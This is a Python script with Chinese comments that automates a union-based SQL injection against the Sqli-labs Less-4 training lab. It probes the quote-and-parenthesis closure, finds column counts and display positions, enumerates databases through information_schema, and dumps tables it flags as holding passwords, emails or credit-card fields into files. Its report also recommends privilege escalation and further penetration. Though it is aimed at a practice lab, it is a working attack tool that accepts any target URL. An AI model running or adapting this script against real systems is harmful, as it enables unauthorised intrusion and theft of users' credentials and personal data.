#!/usr/bin/env python3
"""
Sqli-labs第4关自动化攻击脚本
作者：武文
功能：自动探测注入点 → 信息收集 → 获取全量数据
"""

import requests
import sys
import time
from urllib.parse import quote
import re

class SQLiAutoExploit:
    def __init__(self, base_url):
        """
        初始化攻击对象
        :param base_url: 目标URL，如 http://localhost/sqli-labs/Less-4/
        """
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
        })
        self.injection_type = None  # 存储注入类型
        self.closing_payload = None  # 存储闭合payload
        self.column_count = 0  # 列数
        self.display_positions = []  # 显示位
        
    def print_banner(self):
        """打印程序横幅"""
        banner = """
        ╔══════════════════════════════════════════════════════════╗
        ║      Sqli-labs Less-4 自动化攻击脚本                     ║
        ║      作者：武文 - SQL注入实战系列                        ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[*] 目标: {self.base_url}")
        print("[*] 开始自动化攻击流程...\n")
    
    def test_connection(self):
        """测试连接是否正常"""
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code == 200:
                print("[+] 连接测试成功")
                return True
            else:
                print(f"[-] 连接失败，状态码: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] 连接异常: {str(e)}")
            return False
    
    def detect_injection_point(self):
        """
        探测注入点和闭合方式
        返回: (是否发现注入, 闭合payload)
        """
        print("=" * 60)
        print("[阶段1] 探测注入点")
        print("=" * 60)
        
        test_cases = [
            {"name": "正常访问", "payload": "1", "expect_error": False},
            {"name": "单引号测试", "payload": "1'", "expect_error": False},
            {"name": "双引号测试", "payload": '1"', "expect_error": True},
            {"name": "括号+双引号", "payload": '1")', "expect_error": False},
            {"name": "括号+单引号", "payload": "1')", "expect_error": False},
            {"name": "双引号+注释", "payload": '1"--+', "expect_error": False},
            {"name": "括号双引号+注释", "payload": '1")--+', "expect_error": False},
        ]
        
        for test in test_cases:
            url = f"{self.base_url}/?id={test['payload']}"
            try:
                response = self.session.get(url, timeout=5)
                content = response.text
                
                # 检测错误信息
                has_error = any(error_keyword in content.lower() for error_keyword in 
                              ['error', 'syntax', 'warning', 'mysql', 'sql'])
                
                # 检测页面内容变化
                has_dumb = "Dumb" in content
                
                print(f"  [测试] {test['name']:15} -> 参数: {test['payload']:10} -> ", end="")
                
                if has_error:
                    print("触发SQL错误")
                    # 提取错误信息分析
                    error_match = re.search(r"near '[^']*'", content)
                    if error_match:
                        error_near = error_match.group(0)
                        print(f"     错误信息: {error_near}")
                        
                        # 分析闭合方式
                        if '"' in test['payload'] and '")' in test['payload'] and not has_error:
                            self.closing_payload = '")'
                            self.injection_type = "character_with_parentheses"
                            print(f"[+] 检测到闭合方式: {self.closing_payload}")
                            return True
                        
                elif not has_dumb and test['payload'] != "1":
                    print("页面内容变化")
                else:
                    print("页面正常")
                    
            except Exception as e:
                print(f"请求失败: {str(e)}")
        
        # 如果没有自动检测到，尝试手动推断
        if not self.closing_payload:
            print("\n[!] 自动检测失败，尝试手动推断...")
            # 根据经验，第4关很可能是双引号+括号闭合
            self.closing_payload = '")'
            self.injection_type = "character_with_parentheses"
            print(f"[*] 假定闭合方式为: {self.closing_payload}")
            
            # 验证假定
            test_payload = f"1{self.closing_payload} and (\"1\"=\"1"
            url = f"{self.base_url}/?id={quote(test_payload)}"
            response = self.session.get(url)
            if "Dumb" in response.text:
                print("[+] 假定验证成功")
                return True
        
        return bool(self.closing_payload)
    
    def determine_column_count(self):
        """
        确定查询列数
        """
        print("\n" + "=" * 60)
        print("[阶段2] 确定查询列数")
        print("=" * 60)
        
        max_columns = 15  # 假设最多15列
        
        for i in range(1, max_columns + 1):
            # 方法1: 使用order by
            payload = f"1{self.closing_payload} order by {i}--+"
            url = f"{self.base_url}/?id={quote(payload)}"
            
            try:
                response = self.session.get(url, timeout=5)
                
                if "error" in response.text.lower() or "syntax" in response.text.lower():
                    self.column_count = i - 1
                    print(f"[+] 使用order by确定列数: {self.column_count}")
                    break
                
                # 如果没有报错，继续尝试下一个
                if i == max_columns:
                    print(f"[-] 达到最大列数 {max_columns} 仍未报错")
                    
            except Exception as e:
                print(f"[-] 请求失败: {str(e)}")
                break
        
        # 如果order by失败，尝试union方法
        if self.column_count == 0:
            print("[*] order by方法失败，尝试union方法...")
            for i in range(1, max_columns + 1):
                columns = ",".join(str(j) for j in range(1, i + 1))
                payload = f"-1{self.closing_payload} union select {columns}--+"
                url = f"{self.base_url}/?id={quote(payload)}"
                
                try:
                    response = self.session.get(url, timeout=5)
                    if "error" not in response.text.lower():
                        self.column_count = i
                        print(f"[+] 使用union确定列数: {self.column_count}")
                        break
                except Exception as e:
                    print(f"[-] 请求失败: {str(e)}")
                    break
        
        return self.column_count > 0
    
    def find_display_positions(self):
        """
        寻找数据显示位置
        """
        print("\n" + "=" * 60)
        print("[阶段3] 寻找数据显示位置")
        print("=" * 60)
        
        if self.column_count == 0:
            print("[-] 请先确定列数")
            return False
        
        # 构造union查询，每个位置使用不同数字标识
        columns = []
        for i in range(1, self.column_count + 1):
            columns.append(str(i))
        
        columns_str = ",".join(columns)
        payload = f"-1{self.closing_payload} union select {columns_str}--+"
        url = f"{self.base_url}/?id={quote(payload)}"
        
        try:
            response = self.session.get(url, timeout=5)
            
            # 使用正则表达式查找数字位置
            # 查找类似 "1", "2", "3" 这样的显示
            pattern = r'>\s*(\d+)\s*<'
            matches = re.findall(pattern, response.text)
            
            if matches:
                self.display_positions = [int(m) for m in matches]
                print(f"[+] 发现显示位: {self.display_positions}")
                
                # 显示页面片段，确认显示位
                print("[*] 显示位所在页面片段:")
                lines = response.text.split('\n')
                for i, line in enumerate(lines):
                    if any(str(pos) in line for pos in self.display_positions):
                        print(f"  [行{i}] {line[:100]}...")
            else:
                print("[-] 未找到明显的数字显示位")
                # 尝试其他方法
                print("[*] 尝试搜索常见显示模式...")
                
                # 保存响应内容供分析
                with open('response.html', 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print("[*] 响应已保存到 response.html，请手动分析")
                
                # 假设最后两列是显示位（常见情况）
                if self.column_count >= 2:
                    self.display_positions = [self.column_count - 1, self.column_count]
                    print(f"[*] 假设显示位为: {self.display_positions}")
            
            return len(self.display_positions) > 0
            
        except Exception as e:
            print(f"[-] 请求失败: {str(e)}")
            return False
    
    def get_database_info(self):
        """
        获取数据库基本信息
        """
        print("\n" + "=" * 60)
        print("[阶段4] 获取数据库信息")
        print("=" * 60)
        
        if not self.display_positions:
            print("[-] 没有可用的显示位")
            return {}
        
        info = {}
        
        # 常用信息查询
        queries = {
            "version": "version()",
            "database": "database()",
            "current_user": "user()",
            "hostname": "@@hostname",
        }
        
        # 使用第一个显示位获取信息
        display_pos = self.display_positions[0]
        
        for key, query in queries.items():
            # 构造union查询
            columns = []
            for i in range(1, self.column_count + 1):
                if i == display_pos:
                    columns.append(query)
                else:
                    columns.append(f"'{i}'")  # 使用字符串避免类型问题
            
            columns_str = ",".join(columns)
            payload = f"-1{self.closing_payload} union select {columns_str}--+"
            url = f"{self.base_url}/?id={quote(payload)}"
            
            try:
                response = self.session.get(url, timeout=5)
                # 提取查询结果
                result = self.extract_result_from_response(response.text, query)
                info[key] = result
                print(f"[+] {key}: {result}")
                
            except Exception as e:
                print(f"[-] 获取{key}失败: {str(e)}")
                info[key] = None
        
        return info
    
    def extract_result_from_response(self, html_content, query):
        """
        从HTML响应中提取查询结果
        """
        # 方法1: 使用正则提取显示位附近的数字
        # 这里简化处理，实际需要根据页面结构调整
        
        # 尝试查找包含查询结果的标签
        patterns = [
            r'<td>(.*?)</td>',
            r'<font.*?>(.*?)</font>',
            r'<b>(.*?)</b>',
            r'>\s*([^<>]*?' + re.escape(query[:10]) + '.*?)<',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            if matches:
                for match in matches:
                    # 清理结果
                    clean_match = re.sub(r'<[^>]+>', '', match).strip()
                    if clean_match and len(clean_match) < 1000:  # 避免过长内容
                        return clean_match[:500]  # 截断避免太长
        
        # 如果未找到，返回部分HTML供分析
        return f"未提取到结果，原始内容长度: {len(html_content)}"
    
    def get_all_databases(self):
        """
        获取所有数据库名
        """
        print("\n" + "=" * 60)
        print("[阶段5] 获取所有数据库")
        print("=" * 60)
        
        if not self.display_positions:
            print("[-] 没有可用的显示位")
            return []
        
        display_pos = self.display_positions[0]
        
        # 构造查询
        query = "(select group_concat(schema_name) from information_schema.schemata)"
        
        columns = []
        for i in range(1, self.column_count + 1):
            if i == display_pos:
                columns.append(query)
            else:
                columns.append(f"'{i}'")
        
        columns_str = ",".join(columns)
        payload = f"-1{self.closing_payload} union select {columns_str}--+"
        url = f"{self.base_url}/?id={quote(payload)}"
        
        try:
            response = self.session.get(url, timeout=5)
            databases_text = self.extract_result_from_response(response.text, "schema_name")
            
            if databases_text and "未提取到结果" not in databases_text:
                databases = [db.strip() for db in databases_text.split(',')]
                print(f"[+] 发现 {len(databases)} 个数据库:")
                for i, db in enumerate(databases[:20], 1):  # 最多显示20个
                    print(f"  {i:2}. {db}")
                if len(databases) > 20:
                    print(f"  ... 还有 {len(databases)-20} 个数据库未显示")
                return databases
            else:
                print("[-] 获取数据库列表失败")
                return []
                
        except Exception as e:
            print(f"[-] 获取数据库失败: {str(e)}")
            return []
    
    def get_tables_in_database(self, database_name):
        """
        获取指定数据库的所有表
        """
        print(f"\n[*] 获取数据库 '{database_name}' 的表结构")
        
        if not self.display_positions:
            return []
        
        display_pos = self.display_positions[0]
        
        # 构造查询 - 使用hex编码避免引号问题
        query = f"(select group_concat(table_name) from information_schema.tables where table_schema=0x{database_name.encode().hex()})"
        
        columns = []
        for i in range(1, self.column_count + 1):
            if i == display_pos:
                columns.append(query)
            else:
                columns.append(f"'{i}'")
        
        columns_str = ",".join(columns)
        payload = f"-1{self.closing_payload} union select {columns_str}--+"
        url = f"{self.base_url}/?id={quote(payload)}"
        
        try:
            response = self.session.get(url, timeout=5)
            tables_text = self.extract_result_from_response(response.text, "table_name")
            
            if tables_text and "未提取到结果" not in tables_text:
                tables = [table.strip() for table in tables_text.split(',')]
                print(f"[+] 数据库 '{database_name}' 包含 {len(tables)} 个表:")
                for i, table in enumerate(tables, 1):
                    print(f"  {i:2}. {table}")
                return tables
            else:
                print(f"[-] 获取数据库 '{database_name}' 的表失败")
                return []
                
        except Exception as e:
            print(f"[-] 获取表失败: {str(e)}")
            return []
    
    def get_columns_in_table(self, database_name, table_name):
        """
        获取指定表的所有列
        """
        print(f"[*] 获取表 '{table_name}' 的字段结构")
        
        if not self.display_positions:
            return []
        
        display_pos = self.display_positions[0]
        
        # 使用hex编码
        db_hex = database_name.encode().hex()
        table_hex = table_name.encode().hex()
        
        query = f"(select group_concat(column_name) from information_schema.columns where table_schema=0x{db_hex} and table_name=0x{table_hex})"
        
        columns = []
        for i in range(1, self.column_count + 1):
            if i == display_pos:
                columns.append(query)
            else:
                columns.append(f"'{i}'")
        
        columns_str = ",".join(columns)
        payload = f"-1{self.closing_payload} union select {columns_str}--+"
        url = f"{self.base_url}/?id={quote(payload)}"
        
        try:
            response = self.session.get(url, timeout=5)
            columns_text = self.extract_result_from_response(response.text, "column_name")
            
            if columns_text and "未提取到结果" not in columns_text:
                column_list = [col.strip() for col in columns_text.split(',')]
                print(f"[+] 表 '{table_name}' 包含 {len(column_list)} 个字段:")
                for i, col in enumerate(column_list, 1):
                    print(f"  {i:2}. {col}")
                return column_list
            else:
                print(f"[-] 获取表 '{table_name}' 的字段失败")
                return []
                
        except Exception as e:
            print(f"[-] 获取字段失败: {str(e)}")
            return []
    
    def dump_table_data(self, database_name, table_name, columns):
        """
        导出表数据
        """
        print(f"\n" + "=" * 60)
        print(f"[阶段6] 导出表数据: {database_name}.{table_name}")
        print("=" * 60)
        
        if not self.display_positions or len(self.display_positions) < 2:
            print("[-] 需要至少2个显示位来导出数据")
            return []
        
        if not columns:
            print("[-] 没有可导出的字段")
            return []
        
        # 限制导出字段数量，避免过长
        if len(columns) > 5:
            print(f"[*] 字段过多({len(columns)})，仅导出前5个字段")
            columns = columns[:5]
        
        data = []
        
        # 构造查询 - 使用多个显示位
        # 这里简化处理，实际可能需要根据显示位数量调整
        
        # 方法1: 使用group_concat合并所有数据
        if len(columns) <= 2:  # 如果字段少，可以合并显示
            concat_parts = []
            for col in columns:
                concat_parts.append(col)
                concat_parts.append("':'")
            
            concat_expr = "concat(" + ",".join(concat_parts[:-1]) + ")"  # 去掉最后一个分隔符
            
            query = f"(select group_concat({concat_expr} separator '||') from {database_name}.{table_name})"
            
            # 使用第一个显示位
            display_pos = self.display_positions[0]
            select_columns = []
            for i in range(1, self.column_count + 1):
                if i == display_pos:
                    select_columns.append(query)
                else:
                    select_columns.append(f"'{i}'")
            
            columns_str = ",".join(select_columns)
            payload = f"-1{self.closing_payload} union select {columns_str}--+"
            url = f"{self.base_url}/?id={quote(payload)}"
            
            try:
                response = self.session.get(url, timeout=10)
                data_text = self.extract_result_from_response(response.text, "concat")
                
                if data_text and "未提取到结果" not in data_text:
                    print(f"[+] 获取到 {table_name} 表数据:")
                    records = data_text.split('||')
                    for i, record in enumerate(records[:50], 1):  # 最多显示50条
                        print(f"  {i:3}. {record}")
                        data.append(record)
                    
                    if len(records) > 50:
                        print(f"  ... 还有 {len(records)-50} 条记录未显示")
                    
                    # 保存到文件
                    self.save_data_to_file(database_name, table_name, data_text)
                    
            except Exception as e:
                print(f"[-] 导出数据失败: {str(e)}")
        
        else:
            print("[*] 字段较多，建议使用分段查询或工具导出")
        
        return data
    
    def save_data_to_file(self, database_name, table_name, data):
        """
        保存数据到文件
        """
        filename = f"{database_name}_{table_name}_dump.txt"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Database: {database_name}\n")
                f.write(f"Table: {table_name}\n")
                f.write(f"Dump time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 50 + "\n")
                f.write(data)
            print(f"[+] 数据已保存到文件: {filename}")
        except Exception as e:
            print(f"[-] 保存文件失败: {str(e)}")
    
    def run_full_attack(self):
        """
        执行完整攻击流程
        """
        self.print_banner()
        
        # 阶段0: 测试连接
        if not self.test_connection():
            print("[-] 连接测试失败，退出")
            return False
        
        # 阶段1: 探测注入点
        if not self.detect_injection_point():
            print("[-] 未发现注入点，退出")
            return False
        
        # 阶段2: 确定列数
        if not self.determine_column_count():
            print("[-] 无法确定列数，退出")
            return False
        
        # 阶段3: 寻找显示位
        if not self.find_display_positions():
            print("[-] 无法找到显示位，退出")
            return False
        
        # 阶段4: 获取数据库信息
        db_info = self.get_database_info()
        if not db_info.get('database'):
            print("[-] 无法获取数据库信息")
        
        # 阶段5: 获取所有数据库
        databases = self.get_all_databases()
        
        # 重点处理当前数据库
        current_db = db_info.get('database', 'security')
        if current_db in databases:
            # 获取当前数据库的表
            tables = self.get_tables_in_database(current_db)
            
            # 重点处理users表（如果有）
            for table in ['users', 'admin', 'user', 'account']:
                if table in [t.lower() for t in tables]:
                    print(f"\n[!] 发现重要表: {table}")
                    columns = self.get_columns_in_table(current_db, table)
                    
                    # 检查是否有敏感字段
                    sensitive_columns = []
                    for col in columns:
                        if any(keyword in col.lower() for keyword in 
                              ['user', 'pass', 'name', 'email', 'phone', 'credit']):
                            sensitive_columns.append(col)
                    
                    if sensitive_columns:
                        print(f"[+] 发现敏感字段: {', '.join(sensitive_columns)}")
                        # 导出数据
                        self.dump_table_data(current_db, table, columns)
                        break
        
        print("\n" + "=" * 60)
        print("[完成] 自动化攻击流程结束")
        print("=" * 60)
        
        # 生成报告
        self.generate_report(db_info, databases)
        
        return True
    
    def generate_report(self, db_info, databases):
        """
        生成攻击报告
        """
        print("\n" + "=" * 60)
        print("攻击报告")
        print("=" * 60)
        
        print(f"目标URL: {self.base_url}")
        print(f"注入类型: {self.injection_type}")
        print(f"闭合方式: {self.closing_payload}")
        print(f"查询列数: {self.column_count}")
        print(f"显示位: {self.display_positions}")
        
        print("\n数据库信息:")
        for key, value in db_info.items():
            if value:
                print(f"  {key}: {value}")
        
        print(f"\n发现数据库数: {len(databases)}")
        if databases:
            print("数据库列表:")
            for db in databases[:10]:
                print(f"  - {db}")
            if len(databases) > 10:
                print(f"  ... 还有 {len(databases)-10} 个数据库")
        
        print("\n建议:")
        print("1. 验证获取的数据准确性")
        print("2. 检查是否存在其他敏感表")
        print("3. 尝试提权或进一步渗透")
        print("4. 记录漏洞详情并报告")
    
    def manual_mode(self):
        """
        手动模式：生成payload供手动测试
        """
        print("\n" + "=" * 60)
        print("手动模式 - 常用Payload")
        print("=" * 60)
        
        if self.closing_payload:
            print(f"闭合方式: {self.closing_payload}")
            print(f"列数: {self.column_count}")
            print(f"显示位: {self.display_positions}")
            
            print("\n常用Payload:")
            print(f"1. 基础测试: ?id=1{self.closing_payload}--+")
            print(f"2. 布尔测试: ?id=1{self.closing_payload} and (\"1\"=\"1")
            print(f"3. 获取版本: ?id=-1{self.closing_payload} union select 1,version(),3--+")
            
            if self.column_count > 0:
                # 生成union模板
                template = [str(i) for i in range(1, self.column_count + 1)]
                template_str = ",".join(template)
                print(f"4. Union模板: ?id=-1{self.closing_payload} union select {template_str}--+")
        
        print("\n提示: 使用Burp Suite或手动测试这些payload")

def main():
    """主函数"""
    # 配置目标URL
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        # 默认使用第4关
        target_url = "http://localhost/sqli-labs/Less-4/"
    
    print(f"目标: {target_url}")
    
    # 创建攻击对象
    exploit = SQLiAutoExploit(target_url)
    
    # 选择模式
    print("\n选择模式:")
    print("1. 全自动攻击")
    print("2. 手动模式（仅生成payload）")
    print("3. 自定义测试")
    
    try:
        choice = input("\n请选择模式 (1/2/3，默认1): ").strip()
        
        if choice == '2':
            # 先探测基本信息
            exploit.test_connection()
            exploit.detect_injection_point()
            exploit.determine_column_count()
            exploit.find_display_positions()
            exploit.manual_mode()
        elif choice == '3':
            # 自定义测试
            print("\n自定义测试模式")
            # 这里可以添加自定义测试逻辑
        else:
            # 全自动模式
            success = exploit.run_full_attack()
            if success:
                print("\n[✓] 攻击完成！")
            else:
                print("\n[✗] 攻击失败")
                
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断操作")
    except Exception as e:
        print(f"\n[!] 程序异常: {str(e)}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()